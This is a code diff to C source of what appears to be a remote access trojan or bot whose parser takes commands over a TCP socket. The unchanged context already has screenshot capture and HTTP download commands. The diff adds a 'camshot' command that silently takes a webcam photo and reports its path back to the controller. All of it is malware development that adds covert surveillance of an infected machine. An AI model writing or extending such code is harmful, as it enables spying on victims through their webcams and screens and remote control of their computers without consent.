@@ -70,6 +70,9 @@ ParsedCommand parsecommand(char* raw_command) {
     else if (strcmp(cmd.params[0], "screenshot") == 0) {
         cmd.type = CMD_TAKE_SCREENSHOT;
     }
+    else if (strcmp(cmd.params[0], "camshot") == 0) {
+        cmd.type = CMD_TAKE_CAMSHOT;
+    }
     else if (strcmp(cmd.params[0], "http") == 0) {
         cmd.type = CMD_HTTP_DOWNLOAD;
     }
@@ -228,6 +231,18 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
         }
         else {
             output = _strdup("[!] Failed to take screenshot");
+        }
+        break;
+    }
+
+    case CMD_TAKE_CAMSHOT: {
+        char camshot_path[MAX_PATH];
+        if (take_webcam_photo(camshot_path, MAX_PATH) == 0) {
+            bot_log("Camshot saved at:%s", camshot_path);
+            output = _strdup(camshot_path);
+        }
+        else {
+            output = _strdup("[!] Failed to take camshot");
         }
         break;
     }
